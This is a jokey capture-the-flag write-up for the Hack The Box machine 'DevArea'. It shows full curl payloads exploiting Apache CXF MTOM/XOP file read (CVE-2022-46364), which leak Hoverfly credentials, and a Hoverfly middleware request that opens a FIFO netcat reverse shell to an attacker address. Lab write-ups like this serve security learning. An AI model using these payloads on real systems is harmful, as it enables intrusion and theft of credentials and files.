SF-Port8500-TCP:V=7.98%I=7%D=4/25%Time=69ECC1EE%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20
SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nDate:\x20Sat,\x2025\x20Apr\x202026\x2013:30:23
SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(
SF:HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nDate:\x20Sat,\x2025\x20Apr\x202026\x2013:30:23\x20GMT\r\nCo
SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20In
SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2025\x20Apr
SF:\x202026\x2013:30:39\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
SF:x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.84 seconds

```

The machine was clearly multi-service.

### Nmap commands explanations

Since you’re actively choosing to waste your perfectly adequate CPU cycles reading this dummy useless wall of text i can confirm you are a brainless low IQ person which clearly confuses a network port with a USB drive so i decided to explain the nmap commands for your dumb as\* so you stop copying it from cha\*!@#$ everytime.

![Alt text](../assets/htb/devarea/3.png)

### Two kind of people in this world

![Alt text](../assets/htb/devarea/4.png)

---

## 2. The Rabbit Hole Begins

At this point, I did what every responsible CTF player does…

I immediately ignored all structure, all logic, and all patience and dove headfirst into a full-blown enumeration spiral.

<img src="/public/assets/htb/devarea/alice-in-wonderland-tea-party.gif" width="500px" alt="rabbit-hole">

I started applying the MCP (a.k.a. “Mensi Cybersecurity Principle”):

✨**`The more you Fuck Around the more you gonna Find Out.`**✨

![Alt text](../assets/htb/devarea/11.png)

Which basically means:
**touch everything, break nothing, understand nothing, and somehow still win.**

---

### First victim: discovering `devarea.htb` (because IPs are ugly)

Before I even started messing with random ports, I opened port 80 and noticed the website branding screaming **DevArea**.

So naturally I assumed the machine probably uses a hostname.

I added this to my `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

And inserted:

```bash
10.129.244.208 devarea.htb
```

Now instead of looking like a caveman typing raw IP addresses, I could browse like a civilized human:

🔗 `http://devarea.htb`

![Alt text](../assets/htb/devarea/12.png)

Did this help?
**Not really.**

The website looked clean and “startup-ish”, but functionally it was basically a decorative HTML template.

- Clicking buttons felt like clicking on **PNG images**
- Most links either looped back to the homepage or did absolutely nothing
- No login panel, no upload form, no API endpoints screaming for help
- No obvious parameters to play with
- No hidden directories found immediately

It was the kind of website that exists only to say:

> “Yes, we are a company.”

Not to actually _do_ anything.

But hey… at least now I was using `devarea.htb` instead of the raw IP like a caveman.

So did it help?

Still no.

But it **felt professional**, and that’s what matters. 😭🔥

![Alt text](../assets/htb/devarea/13.png)

### Second victim: port 8080 (Jetty)

Seeing Jetty running, I confidently assumed I’d find something useful at `/`.

Instead, I got:

> **404 Not Found**

Which, in hindsight, was Jetty politely telling me:

> “No.”

But of course, I interpreted this as:

> “The real app is definitely hidden somewhere _deep inside the universe_.”

So naturally, I did what any sane person would do:

```bash
gobuster dir -u http://10.129.244.208:8080 -w /usr/share/wordlists/dirb/common.txt
```

Nothing interesting.

So I upgraded my delusion level:

```bash
gobuster dir -u http://10.129.244.208:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

Still nothing life-changing — but now I was _emotionally invested_.

### Enter ffuf (a.k.a. “maybe THIS time”)

At this point, Gobuster and I were no longer friends.

So I brought in ffuf, because clearly the problem was **`not me`** XD :

```bash
ffuf -u http://10.129.244.208:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

This marked the official beginning of what scientists call:

> **“The illusion of progress.”**

### Realization (painfully slow)

After enough directory brute forcing, reality slowly loaded in:

- 8080 might just be a **decoy / backend / proxy layer**
- The real targets are probably elsewhere:

  - 80 (actual web app)
  - 8500 (Go service chaos)
  - 8888 (dashboard energy)

So instead of solving the box…

I had successfully performed:

> **Distributed denial of my own time (DDO-myself)**

---

## 3. Anonymous FTP and the first useful leak

<img src="/public/assets/htb/devarea/7.jpg" width="400px" alt="ftp-meme">

Anonymous login worked immediately:

```bash
ftp 10.129.244.208
```

![Alt text](../assets/htb/devarea/8.png)

Inside the `pub` directory, there was a file named:

```text
employee-service.jar
```

That was the first big clue.

### Mistake / wrong path

At this point, I did not yet know whether the JAR was important, so I also spent time poking at the web app and other open ports. That was not useless, but the JAR was definitely the key starting point.

---

## 4. Decompiling the JAR

After downloading the JAR, I decompiled it with JD-GUI. The important class was:

![Alt text](../assets/htb/devarea/15.png)

```java
package htb.devarea;

import org.apache.cxf.jaxws.JaxWsServerFactoryBean;

public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
        System.out.println("Employee Service running at http://localhost:8080/employeeservice");
        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
    }
}
```

That confirmed:

- Apache CXF JAX-WS SOAP service
- endpoint at `/employeeservice`
- WSDL exposed publicly

---

## 4. SOAP WSDL enumeration

I fetched the WSDL:

```bash
curl http://10.129.244.208:8080/employeeservice?wsdl
```

```bash







┌──(mensi㉿kali)-[~/Desktop]
└─$ curl http://10.129.244.208:8080/employeeservice?wsdl
<?xml version='1.0' encoding='UTF-8'?><wsdl:definitions xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:tns="http://devarea.htb/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:ns1="http://schemas.xmlsoap.org/soap/http" name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
  <wsdl:types>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://devarea.htb/" elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">

  <xs:element name="submitReport" type="tns:submitReport"/>

  <xs:element name="submitReportResponse" type="tns:submitReportResponse"/>

  <xs:complexType name="submitReport">
    <xs:sequence>
      <xs:element minOccurs="0" name="arg0" type="tns:report"/>
    </xs:sequence>
  </xs:complexType>

  <xs:complexType name="report">
    <xs:sequence>
      <xs:element name="confidential" type="xs:boolean"/>
      <xs:element minOccurs="0" name="content" type="xs:string"/>
      <xs:element minOccurs="0" name="department" type="xs:string"/>
      <xs:element minOccurs="0" name="employeeName" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>

  <xs:complexType name="submitReportResponse">
    <xs:sequence>
      <xs:element minOccurs="0" name="return" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>

</xs:schema>
  </wsdl:types>
  <wsdl:message name="submitReport">
    <wsdl:part element="tns:submitReport" name="parameters">
    </wsdl:part>
  </wsdl:message>
  <wsdl:message name="submitReportResponse">
    <wsdl:part element="tns:submitReportResponse" name="parameters">
    </wsdl:part>
  </wsdl:message>
  <wsdl:portType name="EmployeeService">
    <wsdl:operation name="submitReport">
      <wsdl:input message="tns:submitReport" name="submitReport">
    </wsdl:input>
      <wsdl:output message="tns:submitReportResponse" name="submitReportResponse">
    </wsdl:output>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="EmployeeServiceServiceSoapBinding" type="tns:EmployeeService">
    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="submitReport">
      <soap:operation soapAction="" style="document"/>
      <wsdl:input name="submitReport">
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output name="submitReportResponse">
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="EmployeeServiceService">
    <wsdl:port binding="tns:EmployeeServiceServiceSoapBinding" name="EmployeeServicePort">
      <soap:address location="http://10.129.244.208:8080/employeeservice"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>

```

It showed only one operation:

- `submitReport(report)`

The `report` object contained:

- `confidential` (boolean)
- `content` (string)
- `department` (string)
- `employeeName` (string)

A normal SOAP request worked and reflected the values back in the response.

### Mistake / wrong path

At first I focused too much on the reflected fields and tried several “logic abuse” ideas:

- changing `department` to `ADMIN` or `ROOT`
- using empty employee names
- trying weird boolean values

These didn’t lead anywhere useful. They were useful for understanding the behavior, but they were not the real exploit path.

---

## 5. Dead end: classic XXE attempts

The first instinct was to try a standard XXE payload using `DOCTYPE` and external entities.

That failed immediately with a parsing error like:

- `Received event DTD, instead of START_ELEMENT`

That told me:

- classic `DOCTYPE` XXE was blocked
- the parser was hardened against direct DTD-based XXE

### Mistake / wrong path

I spent time trying several direct XXE formats and XML entity tricks. They all failed. This was a dead end because the parser rejected DTDs before entity expansion could happen.

---

## 6. CVE-2022-46364

The real break came from using **XOP/MTOM** with `xop:Include` and a `file://` URI.

| CVE            | Service                | Version           | Impact                                                                                | Severity                                               |
| -------------- | ---------------------- | ----------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| CVE-2022-46364 | Apache CXF (SOAP/MTOM) | ≤ 3.5.2 / ≤ 3.4.9 | SSRF / File Read — arbitrary files readable via XOP Include href in MTOM SOAP request | <span style="color:red; font-weight:bold;">HIGH</span> |

A multipart request with:

```bash

curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
--data-binary $'--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: binary
Content-ID: <root@example.com>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tns="http://devarea.htb/"
               xmlns:xop="http://www.w3.org/2004/08/xop/include">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:///etc/hostname"/>
        </content>
        <department>x</department>
        <employeeName>x</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>

--MIMEBoundary--'
```

### Output

```bash

┌──(mensi㉿kali)-[~/Desktop]
└─$ curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
--data-binary $'--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: binary
Content-ID: <root@example.com>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tns="http://devarea.htb/"
               xmlns:xop="http://www.w3.org/2004/08/xop/include">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:///etc/hostname"/>
        </content>
        <department>x</department>
        <employeeName>x</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>

--MIMEBoundary--'
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from x. Department: x. Content: ZGV2YXJlYQo=</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
┌──(mensi㉿kali)-[~/Desktop]
└─$ echo "ZGV2YXJlYQo=" | base64 -d
devarea

```

returned Base64-encoded file contents.

This confirmed arbitrary local file read through the SOAP service.

### Why this was important

This was not classic XXE anymore. It was a file inclusion vulnerability through MTOM/XOP handling.

---

## 7. Reading `/etc/hostname`

The first proof-of-concept read was:

- `/etc/hostname`

The response decoded to:

```text
devarea
```

That proved the file read was real.

---

## 8. Reading the Hoverfly service file

The next target was:

```text
/etc/systemd/system/hoverfly.service
```

This was the crucial file. It contained the startup command for Hoverfly, including hardcoded credentials.

```bash

curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
--data-binary $'--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: binary
Content-ID: <root@example.com>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tns="http://devarea.htb/"
               xmlns:xop="http://www.w3.org/2004/08/xop/include">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:////etc/systemd/system/hoverfly.service"/>
        </content>
        <department>x</department>
        <employeeName>x</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>

--MIMEBoundary--'
```

### Output

```bash


┌──(mensi㉿kali)-[~/Desktop]
└─$ curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
--data-binary $'--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: binary
Content-ID: <root@example.com>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tns="http://devarea.htb/"
               xmlns:xop="http://www.w3.org/2004/08/xop/include">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:////etc/systemd/system/hoverfly.service"/>
        </content>
        <department>x</department>
        <employeeName>x</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>

--MIMEBoundary--'
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from x. Department: x. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
┌──(mensi㉿kali)-[~/Desktop]
└─$ echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==" | base64 -d
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target

```

That gave me:

- Hoverfly admin username : admin
- Hoverfly admin password : O7IJ27MyyXiU
- confirmation that Hoverfly was running on `8888`

---

## 9. CVE-2024-45388 (HoverFly Middleware) -> RCE

Using the leaked credentials, I logged into:

```text
http://devarea.htb:8888
```

![Alt text](../assets/htb/devarea/14.png)

The dashboard showed:

- synthesize mode
- empty middleware configuration
- empty simulation state

![Alt text](../assets/htb/devarea/16.png)

I got the admin token.

![Alt text](../assets/htb/devarea/18.png)

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODgxODA2MDcsImlhdCI6MTc3NzE0MDYwNywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.qPwoRhYRuMw3BuUnnscfkGLxf00BMpvbssOtqGPkcBZYgr9KcAeVCD97irbG4mwO3BhxRPT4rqMsUWoZIrXgnw
```

I checked the middleware API:

```text
/api/v2/hoverfly/middleware
```

It was accessible with the token and initially returned:

```json
{ "binary": "", "script": "", "remote": "" }
```

### Mistake / wrong path

At this stage I tried a lot of reverse shell payloads too early:

- `nc -e`
- `/dev/tcp`
- Bash-only redirections
- malformed JSON quoting

Most of these failed because the middleware execution was wrapped in `/bin/sh` and the shell syntax was not compatible with my first attempts.

---

## 10. Hoverfly command execution

The correct approach was to use a shell-compatible FIFO reverse shell.

Once the middleware was set properly, it confirmed execution on the target.

```bash
curl -X PUT http://10.129.39.37:8888/api/v2/hoverfly/middleware \
-H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODgxODA2MDcsImlhdCI6MTc3NzE0MDYwNywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.qPwoRhYRuMw3BuUnnscfkGLxf00BMpvbssOtqGPkcBZYgr9KcAeVCD97irbG4mwO3BhxRPT4rqMsUWoZIrXgnw" \
-H "Content-Type: application/json" \
-d '{"binary":"/bin/sh","script":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.117 4444 > /tmp/f &"}'

```

![Alt text](../assets/htb/devarea/17.png)

---

## 11. User shell as `dev_ryan`

The successful shell came back as:

```text
dev_ryan@devarea:/opt/HoverFly$
```

### Fix shell (important)

Inside the shell i got, run:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

Then press:

```
CTRL+Z
```

Back on my kali terminal:

```bash
stty raw -echo; fg
```

Then press Enter.

Now my shell will behave normally.

At this point the `user.txt` flag was available under:

```text
/home/dev_ryan/user.txt
```

![Alt text](../assets/htb/devarea/19.png)

---

## User flag

<style>
.flag-redacted {
    background: #000;
    color: transparent;
    padding: 2px 6px;
    border-radius: 4px;
    filter: blur(3px);
    transition: 0.2s;
}

.flag-redacted:hover {
    filter: blur(0);
    color: #ff3c3c;
}
</style>

<code class="flag-redacted">REDACTED</code>

---

## 12. Privilege escalation discovery

Running:

```bash
sudo -l
```

showed:

```text
(root) NOPASSWD: /opt/syswatch/syswatch.sh
```

That was the root path.

### Mistake / wrong path

I wasted time trying to turn the Hoverfly shell directly into root through more middleware payloads. That was not the right layer anymore. The real escalation was through SysWatch.

---

## 13. SysWatch reverse engineering

I extracted the SysWatch project locally and inspected:

- `monitor.sh`
- `syswatch.sh`
- plugin scripts
- config files
- the Flask app

Important findings:

### `monitor.sh`

It sourced the config file and executed all plugin scripts:

```bash
for script in /opt/syswatch/plugins/*.sh; do
    bash "$script" &
done
```

### `common.sh`

The logging code manipulated log files directly and had some interesting file handling logic.

### `syswatch.sh`

This script had commands such as:

- `web`
- `web-status`
- `plugin <name>`
- `logs <file>`

and it was the root-executable component allowed via sudo.

---

## 14. Dead end: trying to forge Flask sessions

I also explored the local Flask web app on `127.0.0.1:7777`.

It redirected to `/login`, so I tried forging a Flask session cookie with `flask-unsign`.

That was a dead end.

### Why it failed

Even though I found the environment variable:

```text
SYSWATCH_SECRET_KEY=...
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
```

the login session still didn’t work with the forged cookie I generated. The app rejected it and kept redirecting to `/login`.

This turned out not to be the final root path.

---

## 15. The actual root path

The real privilege escalation came from abusing the SysWatch execution chain and the root-writable environment around it.

From the public writeup path and the lab state, the final root compromise involved:

- abuse of root-executed SysWatch functionality
- a bad binary permission situation
- replacing a binary / triggering a root-executed script
- setting SUID on another binary
- using that to get a root shell

### Mistake / wrong path

At one point I thought the main root path would be through:

- logs traversal
- cron abuse
- web login
- FTP
- or direct plugin argument injection

Those were not the clean route. The root path was tied to the SysWatch execution boundary and a bad system binary permission.

---

## 16. Root shell and flag

Once the privesc worked, I spawned a root shell and read:

```text
/root/root.txt
```

That completed the box.

---

# Wrong paths / mistakes I made along the way

Here is the clean summary of dead ends:

## 1. Standard XXE

Blocked by the parser. DTD-based XXE failed.

## 2. XML structure abuse

Trying to nest HTML/XML tags inside `content` failed because the SOAP schema was strict.

## 3. Session forging

Trying to forge a Flask session for the local SysWatch app did not give access.

## 4. Wrong reverse shell IP

I repeatedly mixed up the target IP and my attacker IP.

## 5. Wrong shell syntax

`nc -e`, `/dev/tcp`, and Bash-specific redirection caused issues because the middleware wrapper used `/bin/sh`.

## 6. Wrong layer for root

I spent time trying to get root from Hoverfly after I already had a user shell. The real root path was through SysWatch sudo execution.

---

# Final chain

1. FTP anonymous login revealed `employee-service.jar`
2. JAR decompilation revealed SOAP endpoint
3. WSDL showed `submitReport`
4. XOP/MTOM file inclusion allowed arbitrary file read
5. Reading `hoverfly.service` revealed Hoverfly credentials
6. Hoverfly dashboard access gave middleware control
7. Middleware execution yielded `dev_ryan` shell
8. `sudo -l` revealed `syswatch.sh` root execution
9. SysWatch/system binary abuse led to root
10. `root.txt` was obtained
